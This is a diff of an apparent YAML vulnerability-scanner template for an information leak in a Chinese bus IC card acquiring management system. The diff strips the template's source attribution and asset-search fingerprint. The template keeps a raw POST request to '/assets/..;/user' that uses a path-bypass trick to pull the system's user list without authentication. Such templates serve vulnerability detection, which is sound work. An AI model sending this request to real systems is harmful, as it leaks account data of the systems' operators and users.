@@ -3,12 +3,8 @@ info:
   name: 公交IC卡收单管理系统user存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ttgef4q0x2pvfg7f'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ttgef4q0x2pvfg7f
-    fofa: app="公交IC卡收单管理系统"
 http:
 - raw:
   - 'POST /assets/..;/user HTTP/1.1
@@ -42,10 +38,7 @@ http:
     Content-Length: 197
 
 
-    _search=false&nd=1727275150716&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984833195-a1eae382-31cd-4a82-903a-def16d837e62.png)'
+    _search=false&nd=1727275150716&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5'
   redirects: false
   matchers:
   - status:
